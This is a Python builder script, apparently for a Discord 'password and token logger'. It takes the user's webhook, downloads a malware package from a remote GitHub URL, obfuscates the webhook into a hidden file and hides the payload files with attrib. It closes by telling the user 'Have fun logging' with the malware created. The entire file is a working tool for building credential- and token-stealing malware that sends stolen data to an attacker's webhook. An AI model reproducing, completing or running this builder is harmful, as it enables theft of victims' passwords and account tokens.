_A='cls'
import requests,json,os,zipfile,time,sys
currentdir=os.getcwd()
request=requests.get('https://raw.githubusercontent.com/SubashCodes/Password-and-token-logger/main/settings.json').text.replace('\n','')
jsone=json.loads(request)
withconsole=jsone['consoledownload']
withoutconsole=jsone['withoutconsole']
menu=f"""

                                     Subify Logger!
                                  Made by Subash#0001     


"""
os.system(_A)
print(menu)
webhook=input('Please Enter your webhook!\n\n->')
try:hm=requests.get(webhook)
except:print('please enter a valid webhook!');time.sleep('2');sys.exit()
if hm.status_code==200:print('\nWebhook is working!')
else:print('Please ensure that the webhook is working!');time.sleep(2);sys.exit()
def downloader():
	D='r';C='Successfully Donwloaded!';B='wb';A='subify.zip';os.system(_A);print(menu);input_=input('Do You want console on your malware or not! (y/n):\n->');download=input_.lower()
	if download=='y':
		print('Downloading, Please wait!');response=requests.get(withconsole)
		with open(A,B)as f:f.write(response.content);f.close
		print(C)
		with zipfile.ZipFile(A,D)as zip_ref:zip_ref.extractall(currentdir);zip_ref.close
		os.remove(A)
	elif download=='n':
		print('Downloading files, please wait!');response=requests.get(withoutconsole)
		with open(A,B)as f:f.write(response.content);f.close
		print(C)
		with zipfile.ZipFile(A,D)as zip_ref:zip_ref.extractall(currentdir);zip_ref.close
	else:print('Input should be Y\\N only!');downloader()
def setup():
	os.system(_A);print(menu);minus='VTyR 8P-';slash='ptSDr S3df/';underscore='FDfds43 ds#kd_';obfustication=webhook.replace('https://discord.com/api/webhooks/','').replace('-',minus).replace('/',slash).replace('_',underscore)
	with open('subify\\log.dl','w')as f:f.write(obfustication);f.close
	os.chdir('subify')
	for items in os.listdir():print(f"{items}");os.system(f'attrib +h +s "{items}"')
	os.system('attrib -h -s subify.exe')
def finish():os.system(_A);print(menu);print("Sucessfully created your malware!\n\nNotes:\n->You can rename the folder and exe name to anything, but Don't put the exe inside of another folder!\n->Do not delete any of the hidden files!\n->Have fun logging :)");time.sleep(1000000)
downloader()
setup()
finish()
